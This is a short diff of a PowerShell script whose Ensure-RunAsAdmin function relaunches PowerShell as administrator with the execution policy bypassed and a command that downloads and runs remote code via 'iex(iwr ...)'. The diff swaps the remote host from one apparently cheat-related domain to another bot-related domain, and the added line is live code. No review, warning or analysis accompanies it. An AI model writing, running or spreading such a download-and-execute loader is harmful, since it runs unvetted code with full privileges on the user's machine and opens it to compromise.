@@ -7,7 +7,7 @@ function Ensure-RunAsAdmin {
 
         # Построение аргументов для повторного запуска
         $scriptPath = $MyInvocation.MyCommand.Definition
-        $arguments = "-NoProfile -ExecutionPolicy Bypass -Command `"iex( iwr qupe.pw/cheat)`""
+        $arguments = "-NoProfile -ExecutionPolicy Bypass -Command `"iex( iwr rf4bot.ru)`""
 
         # Настройка параметров нового процесса
         $psi = New-Object System.Diagnostics.ProcessStartInfo
